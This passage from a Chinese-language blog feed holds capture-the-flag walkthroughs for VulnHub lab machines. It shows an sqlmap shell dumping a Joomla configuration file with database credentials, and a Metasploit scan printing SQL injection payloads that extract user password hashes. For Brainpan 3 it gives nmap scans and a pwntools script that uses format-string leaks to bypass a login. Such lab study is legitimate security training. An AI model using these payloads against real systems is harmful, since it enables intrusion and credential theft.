Directory Traversal                                   </span><br><span class="line">CVE : CVE-2009-0113                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/7691/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking Directory Listing                                                                         </span><br><span class="line">[++] directory has directory listing :                                                                 </span><br><span class="line">http://192.168.84.143:666/tmp                                                                          </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking apache info/status files                                                                  </span><br><span class="line">[++] Readable info/status files are not found                                                          </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] admin finder                                                                                       </span><br><span class="line">[++] Admin page : http://192.168.84.143:666/administrator/                                             </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking robots.txt existing                                                                       </span><br><span class="line">[++] robots.txt is found                                                                               </span><br><span class="line">path : http://192.168.84.143:666/robots.txt                                                            </span><br><span class="line">                                                                                                       </span><br><span class="line">Interesting path found from robots.txt                                                                 </span><br><span class="line">http://192.168.84.143:666/administrator/                                                               </span><br><span class="line">http://192.168.84.143:666/cache/                                                                       </span><br><span class="line">http://192.168.84.143:666/components/                                                                  </span><br><span class="line">http://192.168.84.143:666/images/                                                                      </span><br><span class="line">http://192.168.84.143:666/includes/                                                                    </span><br><span class="line">http://192.168.84.143:666/installation/                                                                </span><br><span class="line">http://192.168.84.143:666/language/                                                                    </span><br><span class="line">http://192.168.84.143:666/libraries/                                                                   </span><br><span class="line">http://192.168.84.143:666/media/                                                                       </span><br><span class="line">http://192.168.84.143:666/modules/                                                                     </span><br><span class="line">http://192.168.84.143:666/plugins/                                                                     </span><br><span class="line">http://192.168.84.143:666/templates/                                                                   </span><br><span class="line">http://192.168.84.143:666/tmp/                                                                         </span><br><span class="line">http://192.168.84.143:666/xmlrpc/                                                                      </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Finding common backup files name                                                                   </span><br><span class="line">[++] Backup files are not found                                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Finding common <span class="built_in">log</span> files name                                                                      </span><br><span class="line">[++] error <span class="built_in">log</span> is not found                                                                            </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking sensitive config.php.x file                                                               </span><br><span class="line">[++] Readable config file is found                                                                     </span><br><span class="line"> config file path : http://192.168.84.143:666/configuration.php-dist </span><br></pre></td></tr></table></figure>

<ul>
<li>使用sqlmap查看配置文件中的phpmyadmin的用户名和密码，然后利用phpmyadmin写木马</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">os-shell&gt; cat configuration.php</span><br><span class="line"><span class="keyword">do</span> you want to retrieve the <span class="built_in">command</span> standard output? [Y/n/a] <span class="built_in">command</span> standard output:</span><br><span class="line">---</span><br><span class="line">&lt;?php</span><br><span class="line">class JConfig &#123;</span><br><span class="line">/* Site Settings */</span><br><span class="line">var <span class="variable">$offline</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$offline_message</span> = <span class="string">&#x27;This site is down for maintenance.&lt;br /&gt; Please check back again soon.&#x27;</span>;</span><br><span class="line">var <span class="variable">$sitename</span> = <span class="string">&#x27;Hackademic.RTB2&#x27;</span>;</span><br><span class="line">var <span class="variable">$editor</span> = <span class="string">&#x27;tinymce&#x27;</span>;</span><br><span class="line">var <span class="variable">$list_limit</span> = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">var <span class="variable">$legacy</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Debug Settings */</span><br><span class="line">var <span class="variable">$debug</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$debug_lang</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Database Settings */</span><br><span class="line">var <span class="variable">$dbtype</span> = <span class="string">&#x27;mysql&#x27;</span>;</span><br><span class="line">var <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">var <span class="variable">$user</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">var <span class="variable">$password</span> = <span class="string">&#x27;yUtJklM97W&#x27;</span>;</span><br><span class="line">var <span class="variable">$db</span> = <span class="string">&#x27;joomla&#x27;</span>;</span><br><span class="line">var <span class="variable">$dbprefix</span> = <span class="string">&#x27;jos_&#x27;</span>;</span><br><span class="line">/* Server Settings */</span><br><span class="line">var <span class="variable">$live_site</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$secret</span> = <span class="string">&#x27;iFzlVUCg9BBPoUDU&#x27;</span>;</span><br><span class="line">var <span class="variable">$gzip</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$error_reporting</span> = <span class="string">&#x27;-1&#x27;</span>;</span><br><span class="line">var <span class="variable">$helpurl</span> = <span class="string">&#x27;http://help.joomla.org&#x27;</span>;</span><br><span class="line">var <span class="variable">$xmlrpc_server</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_host</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_port</span> = <span class="string">&#x27;21&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_user</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_root</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_enable</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$force_ssl</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Locale Settings */</span><br><span class="line">var <span class="variable">$offset</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$offset_user</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Mail Settings */</span><br><span class="line">var <span class="variable">$mailer</span> = <span class="string">&#x27;mail&#x27;</span>;</span><br><span class="line">var <span class="variable">$mailfrom</span> = <span class="string">&#x27;admin@hackademirtb2.com&#x27;</span>;</span><br><span class="line">var <span class="variable">$fromname</span> = <span class="string">&#x27;Hackademic.RTB2&#x27;</span>;</span><br><span class="line">var <span class="variable">$sendmail</span> = <span class="string">&#x27;/usr/sbin/sendmail&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtpauth</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtpsecure</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtpport</span> = <span class="string">&#x27;25&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtpuser</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtppass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtphost</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">/* Cache Settings */</span><br><span class="line">var <span class="variable">$caching</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$cachetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">var <span class="variable">$cache_handler</span> = <span class="string">&#x27;file&#x27;</span>;</span><br><span class="line">/* Meta Settings */</span><br><span class="line">var <span class="variable">$MetaDesc</span> = <span class="string">&#x27;Joomla! - the dynamic portal engine and content management system&#x27;</span>;</span><br><span class="line">var <span class="variable">$MetaKeys</span> = <span class="string">&#x27;joomla, Joomla&#x27;</span>;</span><br><span class="line">var <span class="variable">$MetaTitle</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">var <span class="variable">$MetaAuthor</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">/* SEO Settings */</span><br><span class="line">var <span class="variable">$sef</span>           = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$sef_rewrite</span>   = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$sef_suffix</span>    = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Feed Settings */</span><br><span class="line">var <span class="variable">$feed_limit</span>   = 10;</span><br><span class="line">var <span class="variable">$feed_email</span>   = <span class="string">&#x27;author&#x27;</span>;</span><br><span class="line">var <span class="variable">$log_path</span> = <span class="string">&#x27;/var/www/logs&#x27;</span>;</span><br><span class="line">var <span class="variable">$tmp_path</span> = <span class="string">&#x27;/var/www/tmp&#x27;</span>;</span><br><span class="line">/* Session Setting */</span><br><span class="line">var <span class="variable">$lifetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">var <span class="variable">$session_handler</span> = <span class="string">&#x27;database&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>账号密码为:root/yUtJklM97W</p>
<p>具体参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kZGQ0MWI4NDFjMzY=">phpmyadmin getshell<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li>使用msf中的auxiliary/scanner/http/joomla_plugins模块扫描</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">     .~+P``````-o+:.                                      -o+:.</span><br><span class="line">.+oooyysyyssyyssyddh++os-`````                        ```````````````          `</span><br><span class="line">+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o</span><br><span class="line">++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy</span><br><span class="line">--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///</span><br><span class="line">                                `...............`              `...-/////...`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                  .::::::::::-.                     .::::::-</span><br><span class="line">                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo</span><br><span class="line">                                 :Nm-/NMMMMMMMMMMMMM$<span class="variable">$NMMMMm</span>&amp;&amp;MMMMMMMMMMMMMMy</span><br><span class="line">                                 .sm/`-yMMMMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMMMMh`</span><br><span class="line">                                  -Nd`  :MMMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMMMh`</span><br><span class="line">                                   -Nh` .yMMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMMm/</span><br><span class="line">    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMm/</span><br><span class="line">      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMd</span><br><span class="line">    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/</span><br><span class="line">    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:</span><br><span class="line">          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+</span><br><span class="line">          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::</span><br><span class="line">          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||</span><br><span class="line">........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........</span><br><span class="line">================================================================================</span><br><span class="line">=====================+--------------------------------+=========================</span><br><span class="line">=====================| Session one died of dysentery. |=========================</span><br><span class="line">=====================+--------------------------------+=========================</span><br><span class="line">================================================================================</span><br><span class="line"></span><br><span class="line">                     Press ENTER to size up the situation</span><br><span class="line"></span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It<span class="string">&#x27;s always cool in the lab %%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        Press SPACE BAR to continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v5.0.63-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 &gt; use auxiliary/scanner/http/joomla_plugins</span></span><br><span class="line"><span class="string">msf5 auxiliary(scanner/http/joomla_plugins) &gt; set RHOSTS 192.168.84.143</span></span><br><span class="line"><span class="string">RHOSTS =&gt; 192.168.84.143</span></span><br><span class="line"><span class="string">msf5 auxiliary(scanner/http/joomla_plugins) &gt; set RPORT 666</span></span><br><span class="line"><span class="string">RPORT =&gt; 666</span></span><br><span class="line"><span class="string">msf5 auxiliary(scanner/http/joomla_plugins) &gt; exploit </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Plugin: /administrator/ </span></span><br><span class="line"><span class="string">[+] Plugin: /administrator/index.php?option=com_djartgallery&amp;task=editItem&amp;cid[]=1&#x27;</span>+and+1=1+--+ </span><br><span class="line">[+] Plugin: /administrator/index.php?option=com_searchlog&amp;act=<span class="built_in">log</span> </span><br><span class="line">[+] Plugin: /components/com_abc/ </span><br><span class="line">[+] Page: /index.php?option=com_abc</span><br><span class="line">[+] Plugin: /components/com_amblog/ </span><br><span class="line">[+] Page: /index.php?option=com_amblog</span><br><span class="line">[+] Plugin: /components/com_banners/ </span><br><span class="line">[+] Page: /index.php?option=com_banners</span><br><span class="line">[+] Plugin: /components/com_contact/ </span><br><span class="line">[+] Page: /index.php?option=com_contact</span><br><span class="line">[+] Plugin: /components/com_content/ </span><br><span class="line">[+] Page: /index.php?option=com_content</span><br><span class="line">[+] Plugin: /components/com_mailto/ </span><br><span class="line">[+] Plugin: /components/com_media/ </span><br><span class="line">[+] Plugin: /components/com_newsfeeds/ </span><br><span class="line">[+] Page: /index.php?option=com_newsfeeds</span><br><span class="line">[+] Plugin: /components/com_poll/ </span><br><span class="line">[+] Plugin: /components/com_search/ </span><br><span class="line">[+] Plugin: /components/com_user/ </span><br><span class="line">[+] Page: /index.php?option=com_user</span><br><span class="line">[+] Plugin: /components/com_user/controller.php </span><br><span class="line">[+] Plugin: /components/com_weblinks/ </span><br><span class="line">[+] Page: /index.php?option=com_weblinks</span><br><span class="line">[+] Plugin: /components/com_wrapper/ </span><br><span class="line">[+] Page: /index.php?option=com_wrapper</span><br><span class="line">[+] Plugin: /includes/joomla.php </span><br><span class="line">[+] Plugin: /index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[+] Vulnerability: Potential SQL Injection</span></span><br><span class="line"><span class="string">[+] Plugin: /index.php?option=com_amblog&amp;view=amblog&amp;catid=-1 UNION SELECT @@version </span></span><br><span class="line"><span class="string">[+] Page: /index.php?option=com_amblog&amp;view=amblog&amp;catid=-1 UNION SELECT @@version</span></span><br><span class="line"><span class="string">[+] Plugin: /index.php?option=com_newsfeeds&amp;view=categories&amp;feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos_users-- </span></span><br><span class="line"><span class="string">[+] Page: /index.php?option=com_newsfeeds&amp;view=categories&amp;feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos</span></span><br><span class="line"><span class="string">[+] Plugin: /libraries/joomla/utilities/compat/php50x.php </span></span><br><span class="line"><span class="string">[+] Plugin: /libraries/phpmailer/phpmailer.php </span></span><br><span class="line"><span class="string">[+] Plugin: /libraries/phpxmlrpc/xmlrpcs.php </span></span><br><span class="line"><span class="string">[+] Plugin: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/ </span></span><br><span class="line"><span class="string">[+] Plugin: /plugins/editors/xstandard/attachmentlibrary.php </span></span><br><span class="line"><span class="string">[+] Plugin: /templates/ja_purity/ </span></span><br><span class="line"><span class="string">[*] Scanned 1 of 1 hosts (100% complete)</span></span><br><span class="line"><span class="string">[*] Auxiliary module execution completed</span></span><br></pre></td></tr></table></figure>

<p>发现存在注入漏洞,接下来sqlmap一波就行。</p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan-3]</title>
    <url>/2020/02/03/brainpan-3/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：brainpan：3<br>发行日期：2015年7月27日</p>
<h3 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h3><ul>
<li>万劫不复地狱难度</li>
</ul>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjMuemlw">https://download.vulnhub.com/brainpan/brainpan3.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjMuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/brainpan/brainpan3.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>免责声明<br>使用此虚拟机，即表示您同意，我对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。TL; DR：如果发生坏事，这不是我的错。</p>
<p>设定<br>Brainpan 3经过测试，发现可与VMware Player，VMware Fusion和Virtual Box一起使用。<br>检查并确保Brainpan_III.ova具有以下校验和，以便您知道下载的文件是否完整：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5：170e0d8b26ab721587537fcde69087a0SHA1：ed9ae53c556a1ce6988b3a54621dd6469c8b8aa5</span><br></pre></td></tr></table></figure>

<p>将Brainpan_III.ova导入到您首选的管理程序中，并根据需要配置网络设置。它会通过DHCP获得IP地址，但是建议您在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。</p>
<p>目标<br>root机器并获取flag。</p>
<ul>
<li>barrebas : <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9iYXJyZWJhcw==">https://twitter.com/barrebas<i class="fa fa-external-link-alt"></i></span></li>
<li>Swappage : <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9Td2FwcGFnZQ==">https://twitter.com/Swappage<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.117</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: 08:00:27:90:21:26 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -v -sV -Pn -p- 192.168.56.117 --system-dns</span></span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">1337/tcp open   waste?</span><br><span class="line">8080/tcp closed http-proxy</span><br></pre></td></tr></table></figure>

<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>找到端口1337后，可以开始使用Brainpan3。可以设置一个小的脚本来轻松地与服务器交互：</p>
<p>bp3.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>即使文字说</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>最初的想法是，“太酷了，四位数，Go Go Gadget Brute Force！”。原来，不是在撒谎。经过3次尝试，这个数字确实改变了。</p>
<p>一个登录提示，可以尝试使输入缓冲区溢出，以尝试产生堆栈溢出。这种方法的问题在于，溢出后没有二进制文件可以进行分析。最有意义的漏洞利用是格式字符串。来一些格式字符串试试！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|</span><br><span class="line">  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | </span><br><span class="line">  |   |  __ &lt;    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | </span><br><span class="line"> ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|</span><br><span class="line"></span><br><span class="line">                                                            by superkojiman</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br><span class="line"></span><br><span class="line">ACCESS CODE: $ %x.%x.%x.%x.%x.</span><br><span class="line">ERROR <span class="comment">#4: WHAT IS THIS, AMATEUR HOUR?</span></span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 1</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>Herm ..是否在％x上进行过滤？尝试其他格式的字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ %p.%p.%p.%p.</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: 0xbf8a439c.(nil).0x22dd.0xbf8a439c.</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 2</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>现在知道此输入容易受到恶意格式字符串的攻击。由于正在寻找一个4位数的访问代码，因此可以假定它可能存储在堆栈中。尝试使用％d。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ %d.%d.%d.%d.%d.%d.</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: -1081457764.0.4625.-1081457764.0.10.</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 3</span><br><span class="line"></span><br><span class="line">BRUTE-FORCE ATTEMPT DETECTED</span><br><span class="line">PLEASE USE THE NEW CODE DISPLAYED ON YOUR ACCESS TOKEN</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>啊!这里的第三个数是什么：4625,尝试一下访问代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ 4625</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-7034</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>进来了！在继续进行之前，修改脚本以自动跳过访问代码：</p>
<ul>
<li>发送%d.%d.%d.%d.%d.%d</li>
<li>提取第三个元素（访问代码）</li>
<li>提交访问代码以进行登录</li>
</ul>
<p>从这里开始，将继续向脚本中添加代码片段,结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 8695</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-4373</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: $</span><br></pre></td></tr></table></figure>

<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>现在已经登录，可以做更多的探索。看，已经使用Command 4获得了一个Shell：</p>
